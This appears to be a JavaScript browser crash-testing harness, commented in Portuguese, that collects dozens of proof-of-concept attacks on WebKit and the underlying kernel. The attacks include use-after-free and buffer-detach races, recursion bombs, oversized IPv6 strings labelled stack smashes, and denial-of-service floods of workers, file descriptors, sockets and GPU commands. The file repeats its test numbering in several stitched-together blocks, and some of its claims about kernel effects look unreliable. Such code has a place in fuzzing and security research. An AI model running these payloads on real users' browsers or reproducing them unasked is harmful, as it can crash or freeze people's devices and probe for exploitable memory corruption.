            log("[KERNEL] Iniciando Mutex Destruction...");
            
            if (!navigator.locks) return log("WebLocks off.");
            
            const workerCode = `
                navigator.locks.request("system_lock", {mode: "exclusive"}, async (lock) => {
                    // Segura o lock para sempre
                    await new Promise(r => {}); 
                });
            `;
            const url = URL.createObjectURL(new Blob([workerCode], {type:"text/javascript"}));
            
            // Lança e mata 50 workers
            let count = 0;
            const interval = setInterval(() => {
                const w = new Worker(url);
                
                // Mata o worker enquanto ele segura (ou tenta adquirir) o lock
                // O Kernel é obrigado a limpar o mutex órfão
                setTimeout(() => w.terminate(), 50);
                
                count++;
                if (count > 50) {
                    clearInterval(interval);
                    log("Teste Mutex finalizado.");
                }
            }, 100);
        }

        // --- TESTE 6: gettimeofday vDSO Thrash (Kernel) ---
        function runTimeThrash() {
            log("[KERNEL] Iniciando Time Thrash...");
            
            const workerCode = `
                while(true) {
                    // Leitura de tempo de alta frequência
                    // Estressa a página vDSO partilhada
                    performance.now();
                }
            `;
            const url = URL.createObjectURL(new Blob([workerCode], {type:"text/javascript"}));
            
            // 20 Workers a ler tempo
            for(let i=0; i<20; i++) new Worker(url);
            
            log("20 Workers a ler relógio. Sistema sob stress.");
        }
 function runSortDetach() {
            log("[WebKit] Iniciando Sort Detach...");
            
            try {
                const buffer = new ArrayBuffer(1024 * 1024); // 1MB
                const array = new Uint8Array(buffer);
                
                // Preenche
                for(let i=0; i<array.length; i++) array[i] = Math.random() * 255;
                
                const w = new Worker(URL.createObjectURL(new Blob([""], {type:"text/javascript"})));
                
                let detached = false;
                
                // O GOLPE: Função de comparação transfere o buffer
                array.sort((a, b) => {
                    if (!detached) {
                        log("Comparador ativo. Transferindo buffer...");
                        w.postMessage(buffer, [buffer]);
                        detached = true;
                    }
                    return a - b;
                });
                
                log("Sort finalizado (Seguro se não crashou).");
                w.terminate();
                
            } catch(e) {
                // TypeError é esperado em browsers corrigidos
                log("Resultado: " + e.message);
            }
        }

        // --- TESTE 2: execCommand Recursion Bomb ---
        function runExecRecursion() {
            log("[WebKit] Iniciando Editor Recursion...");
            const box = document.getElementById('editbox');
            box.style.display = 'block';
            box.focus();
            
            let depth = 0;
            
            // Listener que reage à inserção inserindo MAIS
            box.addEventListener('DOMNodeInserted', () => {
                depth++;
                if (depth < 2000) {
                    // Força inserção síncrona
                    document.execCommand('insertHTML', false, '<b>A</b>');
                }
            });
            
            try {
                log("Detonando bomba de edição...");
                document.execCommand('insertHTML', false, '<span>Start</span>');
                log("Editor sobreviveu.");
            } catch(e) {
                log("Erro Editor: " + e.message);
            }
            
            box.innerHTML = "";
            box.style.display = 'none';
        }

        // --- TESTE 3: HTMLSlotElement Assignment Crash ---
        function runSlotCrash() {
            log("[WebKit] Iniciando Slot Assignment...");
            
            try {
                const host = document.createElement('div');
                const root = host.attachShadow({mode: 'open'});
                const slot = document.createElement('slot');
                root.appendChild(slot);
                
                const d1 = document.createElement('div');
                const d2 = document.createElement('div');
                
                // Manual assignment (requer shadow root manual)
                // Se não suportado, o teste falha graciosamente
                if (slot.assign) {
                    log("Assign suportado. Race condition...");
                    
                    // Atribui
                    slot.assign([d1, d2]);
                    
                    // O GOLPE: Remove o slot imediatamente
                    root.removeChild(slot);
                    
                    // Tenta atribuir novamente a um slot 'detached'
                    slot.assign([d2, d1]);
                    
                    log("Slot sobreviveu.");
                } else {
                    log("API slot.assign não disponível.");
                }
                
            } catch(e) {
                log("Erro Slot: " + e.message);
            }
        }

        // --- TESTE 4: WebGL Video Texture DMA Race (Kernel) ---
        function runDMARace() {
            log("[KERNEL] Iniciando DMA Race (Video -> GPU)...");
            
            const gl = document.getElementById('glcanvas').getContext('webgl');
            if(!gl) return log("WebGL off.");
            
            const tex = gl.createTexture();
            gl.bindTexture(gl.TEXTURE_2D, tex);
            
            // Vídeo base64 pequeno válido
            const video = document.createElement('video');
            video.src = "data:video/mp4;base64,AAAAHGZ0eXBtcDQyAAAAAG1wNDJpc29t...."; // Simplificado
            // Em teste real, usar vídeo válido que carregue
            
            let count = 0;
            const interval = setInterval(() => {
                try {
                    // Tenta upload
                    gl.texImage2D(gl.TEXTURE_2D, 0, gl.RGBA, gl.RGBA, gl.UNSIGNED_BYTE, video);
                    
                    // O GOLPE: Destroi o vídeo imediatamente
                    // Se o DMA estiver ativo lendo a memória do vídeo, e nós a libertamos...
                    if (Math.random() > 0.5) {
                        video.src = "";
                        video.load();
                    }
                } catch(e) {}
                
                count++;
                if (count > 1000) {
                    clearInterval(interval);
                    log("DMA Race finalizada.");
                }
            }, 5);
        }

        // --- TESTE 5: WebRTC getStats Kernel UAF (Kernel) ---
        function runStatsRace() {
            log("[KERNEL] Iniciando getStats Race...");
            
            if (!window.RTCPeerConnection) return log("WebRTC off.");
            
            const pcs = [];
            
            const interval = setInterval(() => {
                // Cria conexão
                const pc = new RTCPeerConnection();
                pcs.push(pc);
                
                // Solicita stats
                pc.getStats().then(() => {}).catch(() => {});
                
                // O GOLPE: Fecha imediatamente.
                // O pedido getStats é assíncrono e vai ao Kernel.
                // Se o socket for destruído antes do Kernel responder, UAF.
                pc.close();
                
                if (pcs.length > 500) {
                    clearInterval(interval);
                    log("Stats Race finalizada.");
                }
            }, 10);
        }

        // --- TESTE 6: FileReaderSync Termination Panic (Kernel) ---
        function runSyncTerm() {
            log("[KERNEL] Iniciando Sync Reader Termination...");
            
            // Blob gigante para demorar a ler
            const blob = new Blob([new Array(20 * 1024 * 1024).join("A")]); // 20MB
            
            let count = 0;
            const interval = setInterval(() => {
                const wCode = `
                    onmessage = e => {
                        const fr = new FileReaderSync();
                        // Bloqueia a thread na syscall de leitura
                        fr.readAsText(e.data);
                    }
                `;
                const w = new Worker(URL.createObjectURL(new Blob([wCode], {type:"text/javascript"})));
                
                w.postMessage(blob);
                
                // O GOLPE: Mata o worker enquanto ele está bloqueado no Kernel (read)
                // O Kernel tem de limpar o descritor de arquivo de uma thread morta.
                setTimeout(() => w.terminate(), 10 + Math.random() * 50);
                
                count++;
                if (count > 50) {
                    clearInterval(interval);
                    log("Termination Stress finalizado.");
                }
            }, 100);
        }
 function runTrackUAF() {
            log("[WebKit] Iniciando Track Cue UAF...");
            const video = document.createElement('video');
            const track = video.addTextTrack("captions", "English", "en");
            track.mode = "showing";
            
            // Adiciona Cues
            const cue1 = new VTTCue(0, 1, "Crash 1");
            const cue2 = new VTTCue(1, 2, "Crash 2");
            
            cue1.onenter = () => {
                log("Cue 1 Enter! Destruindo vídeo...");
                // O GOLPE: Remove o vídeo enquanto o motor processa a lista de cues
                // O motor pode tentar disparar onenter para cue2 ou limpar recursos
                if (video.parentNode) video.parentNode.removeChild(video);
                
                // Tenta limpar a track explicitamente
                track.mode = "disabled";
                
                // Aloca lixo
                const junk = new Array(10000).fill(1.1);
            };
            
            track.addCue(cue1);
            track.addCue(cue2);
            document.body.appendChild(video);
            
            // Simula reprodução (pode exigir interação em alguns fw, mas tentamos autoplay)
            video.currentTime = 0.5; // Dispara cue1?
            log("Estado definido. (Se nada acontecer, o FW exige play real)");
        }

        // --- TESTE 2: CustomElement Upgrade Race ---
        function runCustomElementRace() {
            log("[WebKit] Iniciando CustomElement Race...");
            const name = "x-crash-" + Math.floor(Math.random()*10000);
            
            class XCrash extends HTMLElement {
                constructor() {
                    super();
                    log("Construtor chamado. Destruindo...");
                    // O GOLPE: O elemento está sendo criado (upgrade).
                    // Nós o removemos do documento ou alteramos seu estado violentamente.
                    this.remove();
                    document.body.innerHTML = ""; // Destruição em massa
                }
            }
            
            const el = document.createElement(name);
            document.body.appendChild(el);
            
            // Define DEPOIS de criar (Upgrade)
            log("Definindo elemento (Upgrade Trigger)...");
            customElements.define(name, XCrash);
        }

        // --- TESTE 3: XSLT document() Recursion ---
        function runXSLTRecursion() {
            log("[WebKit] Iniciando XSLT Recursion...");
            
            const xslData = `
                <xsl:stylesheet version="1.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform">
                    <xsl:template match="/">
                        <xsl:apply-templates select="document('')"/>
                    </xsl:template>
                </xsl:stylesheet>
            `;
            
            const parser = new DOMParser();
            const xslt = parser.parseFromString(xslData, "text/xml");
            const xml = parser.parseFromString("<root/>", "text/xml");
            
            const proc = new XSLTProcessor();
            proc.importStylesheet(xslt);
            
            try {
                log("Transformando...");
                // Loop infinito nativo: document('') carrega o próprio stylesheet
                proc.transformToFragment(xml, document);
                log("XSLT parou (Stack Limit).");
            } catch(e) {
                log("Erro XSLT: " + e.message);
            }
        }

        // --- TESTE 4: VFS Name Cache Flood (Kernel) ---
        function runNameCacheFlood() {
            log("[KERNEL] Iniciando Name Cache Flood...");
            
            const blob = new Blob(["x"]);
            let count = 0;
            
            const interval = setInterval(() => {
                // Cria e revoga 100 URLs por ciclo
                // Cada createObjectURL adiciona uma entrada na hash table do VFS
                // Cada revokeObjectURL remove.
                // O churn (agitação) alta estressa o lock do cache.
                for(let i=0; i<100; i++) {
                    const u = URL.createObjectURL(blob);
                    URL.revokeObjectURL(u);
                }
                count += 100;
                
                if (count % 1000 === 0) log(`URLs recicladas: ${count}`);
                
                if (count > 50000) {
                    clearInterval(interval);
                    log("Teste VFS finalizado.");
                }
            }, 10);
        }

        // --- TESTE 5: GPU Fence Sync Deadlock (Kernel) ---
        function runGPUFenceDeadlock() {
            log("[KERNEL] Iniciando GPU Fence Deadlock...");
            
            const canvas = document.getElementById('gl');
            const gl = canvas.getContext('webgl');
            if (!gl) return log("WebGL off.");
            
            const workerCode = `
                onmessage = (e) => {
                    const canvas = new OffscreenCanvas(100, 100);
                    const gl = canvas.getContext('webgl');
                    
                    // Desenho pesado
                    gl.clearColor(1, 0, 0, 1);
                    gl.clear(gl.COLOR_BUFFER_BIT);
                    
                    // Tenta ler pixels (Bloqueante / Sync)
                    // Isso coloca a thread em espera pela GPU
                    const p = new Uint8Array(4);
                    gl.readPixels(0, 0, 1, 1, gl.RGBA, gl.UNSIGNED_BYTE, p);
                    
                    // Worker termina ou é morto aqui
                };
            `;
            const url = URL.createObjectURL(new Blob([workerCode], {type:"text/javascript"}));
            
            // Lança e mata Workers bloqueados na GPU
            let i = 0;
            const interval = setInterval(() => {
                const w = new Worker(url);
                w.postMessage("draw");
                
                // Mata no momento provável do readPixels
                setTimeout(() => w.terminate(), 10); // Ajustar timing
                
                i++;
                if (i > 100) {
                    clearInterval(interval);
                    log("GPU Stress finalizado.");
                }
            }, 50);
        }

        // --- TESTE 6: Socket Spinlock Stress (Kernel) ---
        function runSocketSpinlock() {
            log("[KERNEL] Iniciando Socket Spinlock Stress...");
            
            const sockets = [];
            let i = 0;
            
            const interval = setInterval(() => {
                // Cria e fecha sockets instantaneamente
                // Estressa a alocação/desalocação e os locks da lista de sockets
                try {
                    const ws = new WebSocket("ws://127.0.0.1:0"); // Porta inválida falha rápido
                    ws.onclose = () => {}; 
                    ws.close(); // Fecha já
                } catch(e) {}
                
                i++;
                if (i % 500 === 0) log(`Sockets ciclados: ${i}`);
                if (i > 5000) {
                    clearInterval(interval);
                    log("Spinlock Test finalizado.");
                }
            }, 2);
        }
 // --- TESTE 1: String.normalize Expansion Bomb ---
        function runUnicodeBomb() {
            log("[WebKit] Iniciando Unicode Bomb...");
            
            try {
                // Caractere que expande em NFKC (ex: ? expande para "bismallah...")
                // Ou caracteres de composição acumulativa
                const toxicChar = "\uFDFA"; // Ligadura árabe gigante
                
                // Cria string de 500.000 chars
                const str = toxicChar.repeat(500000); 
                
                log("Expandindo string (Normalização)...");
                // A normalização pode multiplicar o tamanho por 10x ou mais na memória
                const exploded = str.normalize("NFKC");
                
                log("Expansão concluída. Length: " + exploded.length);
                
                // Tenta forçar alocação contígua
                const slice = exploded.substring(0, exploded.length);
                
            } catch(e) {
                log("Erro Unicode: " + e.message);
            }
        }

        // --- TESTE 2: CSSKeyframes Mutation Race ---
        function runKeyframeRace() {
            log("[WebKit] Iniciando Keyframe Race...");
            
            const style = document.createElement('style');
            document.head.appendChild(style);
            const sheet = style.sheet;
            
            // Insere regra de keyframe
            sheet.insertRule("@keyframes crash { 0% { opacity: 0; } 100% { opacity: 1; } }", 0);
            const keyframes = sheet.cssRules[0];
            
            const div = document.getElementById('animbox');
            div.style.animation = "crash 1s infinite linear";
            
            let i = 0;
            const interval = setInterval(() => {
                // Modifica as regras ENQUANTO a animação roda
                try {
                    // Remove regra aleatória
                    if (keyframes.cssRules.length > 0) keyframes.deleteRule(0);
                    
                    // Adiciona regra nova
                    keyframes.appendRule(`${i}% { transform: rotate(${i}deg); }`);
                    
                    // Força reflow
                    div.offsetWidth; 
                } catch(e) {}
                
                i = (i + 1) % 100;
                if (i === 0 && Math.random() > 0.9) log("Ciclo de mutação ativo...");
            }, 0); // O mais rápido possível
            
            setTimeout(() => {
                clearInterval(interval);
                div.style.animation = "";
                document.head.removeChild(style);
                log("Race finalizada.");
            }, 5000);
        }

        // --- TESTE 3: Fetch AbortController Leak ---
        function runFetchLeak() {
            log("[WebKit] Iniciando Fetch Leak...");
            
            const count = 20000;
            let done = 0;
            
            const interval = setInterval(() => {
                for(let i=0; i<100; i++) {
                    const ac = new AbortController();
                    // Inicia fetch
                    fetch(window.location.href + "?leak=" + Math.random(), { signal: ac.signal })
                        .catch(()=>{});
                    
                    // Aborta imediatamente
                    // Se o WebKit não limpar o ouvinte do sinal, vaza memória
                    ac.abort();
                    done++;
                }
                
                if (done % 5000 === 0) log(`Fetches abortados: ${done}`);
                
                if (done >= count) {
                    clearInterval(interval);
                    log("Leak Test finalizado.");
                }
            }, 10);
        }

        // --- TESTE 4: WebSocket Frame Fragmentation (Kernel) ---
        function runFragFlood() {
            log("[KERNEL] Iniciando Frame Fragmentation...");
            
            const ws = new WebSocket("wss://echo.websocket.org");
            
            ws.onopen = () => {
                log("Socket aberto. Enviando frames de 1 byte...");
                
                // Envia 1MB em pedaços de 1 byte
                const total = 1024 * 1024;
                const chunk = new Uint8Array(1).fill(65);
                let sent = 0;
                
                const interval = setInterval(() => {
                    // Envia rajada de 1000 frames
                    for(let i=0; i<1000; i++) {
                        if (ws.bufferedAmount < 5 * 1024 * 1024) {
                            ws.send(chunk);
                            sent++;
                        }
                    }
                    
                    if (sent >= total) {
                        clearInterval(interval);
                        ws.close();
                        log("Flood enviado. Verifique remontagem do Kernel.");
                    }
                }, 5);
            };
        }

        // --- TESTE 5: SharedMemory Descriptor Leak (Kernel) ---
        function runSHMLeak() {
            log("[KERNEL] Iniciando SHM Descriptor Leak...");
            
            if (!window.SharedArrayBuffer) return log("SAB off.");
            
            const wUrl = URL.createObjectURL(new Blob([""], {type:"text/javascript"}));
            let count = 0;
            
            const interval = setInterval(() => {
                // Cada SAB cria um objeto shm no kernel (file descriptor)
                const sab = new SharedArrayBuffer(1024);
                
                // Envia para worker para garantir mapeamento
                const w = new Worker(wUrl);
                w.postMessage(sab);
                
                // Mata worker sem fechar explicitamente (depende do cleanup do Kernel)
                w.terminate();
                
                count++;
                if (count % 1000 === 0) log(`SHM Objects: ${count}`);
                
                if (count > 20000) {
                    clearInterval(interval);
                    log("Limite SHM testado.");
                }
            }, 2);
        }

        // --- TESTE 6: GPU Command Buffer Stall (Kernel) ---
        function runGPUStall() {
            log("[KERNEL] Iniciando GPU Stall...");
            
            const gl = document.getElementById('gl').getContext('webgl');
            if(!gl) return log("WebGL off.");
            
            // Shader simples
            const vs = gl.createShader(gl.VERTEX_SHADER);
            gl.shaderSource(vs, "void main() { gl_Position = vec4(0,0,0,1); }");
            gl.compileShader(vs);
            const p = gl.createProgram();
            gl.attachShader(p, vs);
            gl.linkProgram(p);
            gl.useProgram(p);
            
            log("Enchendo Command Buffer...");
            
            // Loop infinito de draw calls SÍNCRONOS (sem requestAnimationFrame)
            // Isso inunda o driver com comandos
            const start = Date.now();
            while (Date.now() - start < 3000) { // Tenta travar por 3s
                gl.drawArrays(gl.POINTS, 0, 1);
                // flush opcional, mas queremos encher o buffer local
            }
            
            log("GPU Bomb enviada.");
        }
 // --- TESTE 1: CSS :nth-last-child Exponential Recalc ---
        function runCSSExp() {
            log("[WebKit] Iniciando CSS Recalc Bomb...");
            const sandbox = document.getElementById('css-sandbox');
            sandbox.innerHTML = "";
            
            // Cria estrutura profunda de DIVs
            let html = "";
            const depth = 200; // Profundidade
            for(let i=0; i<depth; i++) html += "<div>";
            for(let i=0; i<depth; i++) html += "</div>";
            sandbox.innerHTML = html;
            
            const style = document.createElement('style');
            // Regra recursiva complexa: div dentro de div, contando do fim
            // Isso força o motor a reavaliar a árvore inteira para cada nó
            style.textContent = `
                div:nth-last-child(odd) > div:nth-last-child(odd) {
                    margin-left: 1px;
                    transition: all 0.1s;
                }
                div:hover { margin-left: 10px; }
            `;
            
            document.head.appendChild(style);
            
            log("Forçando Reflow Exponencial...");
            
            // Força leitura de layout
            setTimeout(() => {
                const h = sandbox.offsetHeight;
                log("Layout calculado. Adicionando classe de stress...");
                // Modificar o DOM agora força recalculo total
                sandbox.firstChild.className = "trigger";
                
                setTimeout(() => {
                    document.head.removeChild(style);
                    sandbox.innerHTML = "";
                    log("Teste CSS finalizado.");
                }, 2000);
            }, 100);
        }

        // --- TESTE 2: Intl Timezone Cache Overflow ---
        function runIntlCache() {
            log("[WebKit] Enchendo Intl Cache...");
            
            try {
                // Tenta formatar data com milhares de timezones diferentes (válidos e inválidos)
                // A lib ICU tenta fazer cache das estruturas de fuso horário
                let count = 0;
                const interval = setInterval(() => {
                    for(let i=0; i<100; i++) {
                        try {
                            // Gera nomes aleatórios para forçar lookup e cache miss
                            const tz = "GMT+" + (count % 12) + ":" + (i % 60);
                            new Intl.DateTimeFormat('en', { timeZone: tz }).format(new Date());
                        } catch(e) {}
                        count++;
                    }
                    
                    if (count % 1000 === 0) log(`Timezones processados: ${count}`);
                    
                    if (count > 20000) {
                        clearInterval(interval);
                        log("Cache Overflow testado.");
                    }
                }, 10);
                
            } catch(e) {
                log("Erro Intl: " + e.message);
            }
        }

        // --- TESTE 3: SharedArrayBuffer DataView Race ---
        function runSABView() {
            log("[WebKit] Iniciando SAB DataView Race...");
            
            if (!window.SharedArrayBuffer) return log("SAB off.");
            
            const sab = new SharedArrayBuffer(16);
            const view = new DataView(sab);
            
            const workerCode = `
                onmessage = e => {
                    const view = new DataView(e.data);
                    while(true) {
                        // Escreve padrão alternado rapidamente
                        view.setFloat64(0, 1.23456789);
                        view.setFloat64(0, 9.87654321);
                    }
                }
            `;
            const url = URL.createObjectURL(new Blob([workerCode], {type:"text/javascript"}));
            const w = new Worker(url);
            w.postMessage(sab);
            
            // Leitura na main thread
            let i = 0;
            const interval = setInterval(() => {
                // Tenta apanhar uma leitura "rasgada" (corrompida)
                const val = view.getFloat64(0);
                if (val !== 1.23456789 && val !== 9.87654321 && val !== 0) {
                    log("Torn Read Detectado! Val: " + val);
                }
                i++;
                if (i > 1000) {
                    clearInterval(interval);
                    w.terminate();
                    log("Teste SAB finalizado.");
                }
            }, 1);
        }

        // --- TESTE 4: UDP Zero-Length Packet Flood (Kernel) ---
        function runZeroUDP() {
            log("[KERNEL] Iniciando UDP Zero-Packet Flood...");
            
            if (!window.RTCPeerConnection) return log("WebRTC off.");
            
            const pc = new RTCPeerConnection();
            const dc = pc.createDataChannel("flood", {ordered: false, maxRetransmits: 0});
            
            // Payload Vazio (0 bytes)
            // Força alocação de mbuf header sem cluster de dados
            const empty = new Uint8Array(0);
            
            dc.onopen = () => {
                log("Canal aberto. Disparando pacotes vazios...");
                const interval = setInterval(() => {
                    if (dc.bufferedAmount < 1024 * 1024) {
                        for(let i=0; i<1000; i++) dc.send(empty);
                    }
                }, 5);
                
                setTimeout(() => {
                    clearInterval(interval);
                    pc.close();
                    log("UDP Zero Flood finalizado.");
                }, 5000);
            };
            
            pc.createOffer().then(o => pc.setLocalDescription(o));
        }

        // --- TESTE 5: LocalStorage Locking Storm (Kernel) ---
        function runStorageStorm() {
            log("[KERNEL] Iniciando SQLite Lock Storm...");
            
            const workerCode = `
                onmessage = () => {
                    setInterval(() => {
                        // Tenta adquirir lock de escrita no DB
                        try {
                            localStorage.setItem("storm", Math.random());
                        } catch(e) {}
                    }, 0);
                }
            `;
            const url = URL.createObjectURL(new Blob([workerCode], {type:"text/javascript"}));
            
            // 50 Workers competindo pelo mesmo ficheiro
            for(let i=0; i<50; i++) {
                new Worker(url).postMessage("go");
            }
            log("50 Workers a martelar o LocalStorage. I/O deve bloquear.");
        }

        // --- TESTE 6: Zombie Thread Termination Flood (Kernel) ---
        function runZombieThreads() {
            log("[KERNEL] Criando Threads Zumbis...");
            
            const workerCode = `
                // Loop infinito matemático (User Mode puro)
                // Difícil para o Kernel interromper sem sinal forçado
                while(true) { Math.sin(Math.random()); }
            `;
            const url = URL.createObjectURL(new Blob([workerCode], {type:"text/javascript"}));
            
            let count = 0;
            const interval = setInterval(() => {
                const w = new Worker(url);
                
                // Deixa rodar um pouco e mata
                setTimeout(() => {
                    w.terminate();
                }, 50);
                
                count++;
                if (count % 10 === 0) log(`Threads cicladas: ${count}`);
                
                if (count > 100) {
                    clearInterval(interval);
                    log("Teste Zombie finalizado. Verifique se o sistema ficou lento.");
                }
            }, 100);
        }

// --- TESTE 1: MessagePort Entangled Cycle GC ---
        function runPortCycle() {
            log("[WebKit] Criando Ciclo de Portas (IPC GC)...");
            
            // Cria ciclo complexo distribuído
            const ch1 = new MessageChannel();
            const ch2 = new MessageChannel();
            
            // Porta 1 segura Porta 2
            ch1.port1.postMessage("entangle", [ch2.port1]);
            
            // Porta 2 segura Porta 1 (Ciclo)
            ch2.port2.postMessage("entangle", [ch1.port2]);
            
            log("Ciclo criado. Libertando referências...");
            
            // Solta tudo para o GC
            // O WebKit tem um GC especial para portas que cruzam threads
            // Se falhar, as portas ficam "zumbis" ou crasham ao tentar fechar
            window.gc_trigger = { a: ch1, b: ch2 }; // Mantém vivo por um instante
            setTimeout(() => {
                window.gc_trigger = null;
                // Aloca memória para forçar GC
                const junk = new ArrayBuffer(1024 * 1024 * 50);
                log("GC forçado. Verifique estabilidade.");
            }, 100);
        }

        // --- TESTE 2: HTMLForm Recursive Submit ---
        function runFormRecursion() {
            log("[WebKit] Iniciando Form Recursion...");
            
            const form = document.createElement('form');
            form.action = "#";
            document.body.appendChild(form);
            
            let depth = 0;
            form.addEventListener('submit', (e) => {
                e.preventDefault();
                depth++;
                if (depth < 2000) {
                    // requestSubmit constrói o payload do form nativamente
                    // Recursão aqui gasta stack C++
                    try { form.requestSubmit(); } catch(x){}
                } else {
                    log("Limite de recursão atingido.");
                }
            });
            
            try {
                log("Disparando submit chain...");
                form.requestSubmit();
            } catch(e) {
                log("Erro Form: " + e.message);
            }
            document.body.removeChild(form);
        }

        // --- TESTE 3: CanvasPattern Video UAF ---
        function runPatternUAF() {
            log("[WebKit] Iniciando Pattern UAF...");
            const ctx = document.getElementById('c').getContext('2d');
            
            const video = document.createElement('video');
            // Vídeo dummy válido (base64 curto mp4)
            video.src = "data:video/mp4;base64,AAAAHGZ0eXBtcDQyAAAAAG1wNDJpc29tAAAAAAAD"; 
            
            // Tenta criar padrão assim que possível
            setTimeout(() => {
                try {
                    const ptrn = ctx.createPattern(video, 'repeat');
                    ctx.fillStyle = ptrn;
                    
                    // Desenha massivamente
                    for(let i=0; i<1000; i++) {
                        ctx.fillRect(0,0,500,500);
                        
                        // O GOLPE: Mata o vídeo no meio do desenho
                        if (i === 500) {
                            log("Destruindo fonte do vídeo...");
                            video.src = "";
                            video.load();
                        }
                    }
                    log("Desenho finalizado.");
                } catch(e) {
                    log("Erro Pattern: " + e.message);
                }
            }, 100);
        }

        // --- TESTE 4: Reverse DNS Stack Smash (Kernel) ---
        function runReverseDNS() {
            log("[KERNEL] Iniciando Reverse DNS Stress...");
            
            if (!window.RTCPeerConnection) return log("WebRTC off.");
            
            // Tenta forçar logs de conexão com IPs bizarros
            // IPv6 malformado gigante para estourar buffers de log/netdb
            const badIP = "2001:" + "db8:".repeat(500) + "1";
            
            const pc = new RTCPeerConnection({
                iceServers: [{urls: `stun:[${badIP}]:3478`}]
            });
            
            pc.createOffer().catch(e => {
                // Erro esperado, mas o Kernel tentou processar a string?
                log("Oferta criada/falhou (Seguro).");
            });
            
            setTimeout(() => pc.close(), 1000);
        }

        // --- TESTE 5: GPU Query Object Exhaustion (Kernel) ---
        function runGPUQueries() {
            log("[KERNEL] Esgotando GPU Queries...");
            
            const gl = document.getElementById('gl').getContext('webgl2'); // WebGL2 para queries
            if (!gl) return log("WebGL2 necessário para Query Objects.");
            
            const queries = [];
            let count = 0;
            
            const interval = setInterval(() => {
                try {
                    // Aloca 500 handles por ciclo
                    for(let i=0; i<500; i++) {
                        const q = gl.createQuery();
                        gl.beginQuery(gl.ANY_SAMPLES_PASSED, q);
                        gl.endQuery(gl.ANY_SAMPLES_PASSED);
                        queries.push(q);
                        count++;
                    }
                    log(`Queries ativas: ${count}`);
                } catch(e) {
                    log("Falha GPU (Limite atingido): " + e.message);
                    clearInterval(interval);
                }
                
                if (count > 50000) {
                    clearInterval(interval);
                    log("Teste GPU finalizado.");
                }
            }, 50);
        }

        // --- TESTE 6: File Descriptor Storm (Kernel) ---
        function runFDStorm() {
            log("[KERNEL] Iniciando FD Storm (MessageChannels)...");
            
            const channels = [];
            let count = 0;
            
            const interval = setInterval(() => {
                // Cada canal gasta 2 FDs (pipes)
                try {
                    for(let i=0; i<100; i++) {
                        const mc = new MessageChannel();
                        channels.push(mc); // Mantém referência para não fechar
                        count += 2;
                    }
                    if (count % 1000 === 0) log(`FDs abertos: ~${count}`);
                } catch(e) {
                    log("Limite FD atingido (EMFILE): " + e.message);
                    clearInterval(interval);
                    
                    // Tenta abrir algo mais para confirmar falha global
                    try { new Worker(""); } catch(x) { log("Sistema instável: Não abre Workers."); }
                }
            }, 10);
        }
function runMSERace() {
            log("[WebKit] Iniciando MSE Detach Race...");
            
            if (!window.MediaSource) return log("MSE API off.");
            
            const ms = new MediaSource();
            const url = URL.createObjectURL(ms);
            const video = document.createElement('video');
            video.src = url;
            
            ms.onsourceopen = () => {
                try {
                    const sb = ms.addSourceBuffer('video/mp4; codecs="avc1.42E01E, mp4a.40.2"');
                    const buf = new Uint8Array(1024 * 1024); // 1MB buffer
                    
                    // Worker para roubar o buffer
                    const w = new Worker(URL.createObjectURL(new Blob([""], {type:"text/javascript"})));
                    
                    // O GOLPE: appendBuffer lê o buffer.
                    // postMessage transfere (detach) o buffer.
                    // Tenta fazer os dois ao mesmo tempo.
                    sb.appendBuffer(buf);
                    w.postMessage(buf.buffer, [buf.buffer]);
                    
                    log("Race executada. Se não crashar, seguro.");
                    w.terminate();
                } catch(e) {
                    log("Erro MSE: " + e.message);
                }
            };
        }

        // --- TESTE 2: WebAssembly Memory Grow Race ---
        function runWasmGrow() {
            log("[WebKit] Iniciando Wasm Grow Race...");
            
            if (!window.WebAssembly) return log("Wasm off.");
            
            // Memória partilhada
            const memory = new WebAssembly.Memory({ initial: 1, maximum: 100, shared: true });
            const view = new Int32Array(memory.buffer);
            
            const workerCode = `
                onmessage = (e) => {
                    const mem = e.data;
                    const view = new Int32Array(mem.buffer);
                    // Tenta escrever enquanto a memória é realocada (grow) na main thread
                    setInterval(() => {
                        try { view[0] = 0xDEADBEEF; } catch(x){}
                    }, 0);
                }
            `;
            const w = new Worker(URL.createObjectURL(new Blob([workerCode], {type:"text/javascript"})));
            w.postMessage(memory);
            
            let i = 0;
            const interval = setInterval(() => {
                try {
                    memory.grow(1);
                    i++;
                    if (i > 50) {
                        clearInterval(interval);
                        w.terminate();
                        log("Wasm Grow Race finalizada.");
                    }
                } catch(e) {
                    clearInterval(interval);
                    log("Wasm Limit: " + e.message);
                }
            }, 10);
        }

        // --- TESTE 3: Map Rehash Heap Overflow ---
        function runMapRehash() {
            log("[WebKit] Enchendo Map para Rehash...");
            
            const map = new Map();
            const limit = 200000;
            
            try {
                // Insere objetos para forçar uso de memória no heap
                for(let i=0; i<limit; i++) {
                    map.set({id: i}, i);
                    if (i % 50000 === 0) log(`Map size: ${i}`);
                }
                
                log("Forçando limpeza e re-inserção...");
                // Limpa e enche de novo para fragmentar o alocador do Map
                map.clear();
                for(let i=0; i<limit; i++) {
                    map.set("key"+i, "val"+i);
                }
                
                log("Map Stress testado.");
            } catch(e) {
                log("Erro Map (OOM?): " + e.message);
            }
        }

        // --- TESTE 4: IPv6 Address Stack Smash (Kernel) ---
        function runIPv6Smash() {
            log("[KERNEL] Iniciando IPv6 Stack Smash...");
            
            // Gera um "endereço IPv6" malformado gigante
            // O Kernel pode tentar validar isso em buffers na stack
            const part = "FFFF:";
            const hugeIP = "[" + part.repeat(1000) + "1]"; // ~5000 chars
            
            try {
                log("Conectando a IPv6 gigante...");
                // fetch tenta resolver o host
                fetch("http://" + hugeIP).catch(e => {
                    log("Fetch falhou (Esperado): " + e.message);
                });
                
                // Tenta WebSocket também (usa syscalls diferentes)
                const ws = new WebSocket("ws://" + hugeIP);
                ws.onerror = () => {};
                
            } catch(e) {
                log("Erro Rede: " + e.message);
            }
        }

        // --- TESTE 5: IPC Circular Serialization Panic (Kernel) ---
        function runIPCSerialize() {
            log("[KERNEL] Testando IPC Circular Panic...");
            
            const channel = new MessageChannel();
            
            // Cria objeto circular profundo
            const a = { next: null };
            const b = { prev: a };
            a.next = b;
            
            // Aninha profundamente
            let curr = a;
            for(let i=0; i<1000; i++) {
                curr.val = { next: curr };
                curr = curr.val;
            }
            
            try {
                log("Enviando objeto circular complexo...");
                // O Kernel tenta serializar. Se a deteção de ciclo falhar ou estourar a stack...
                channel.port1.postMessage(a);
                
                // Fecha imediatamente para interromper a serialização no meio
                channel.port1.close();
                log("Envio feito.");
            } catch(e) {
                log("Erro IPC: " + e.message);
            }
        }

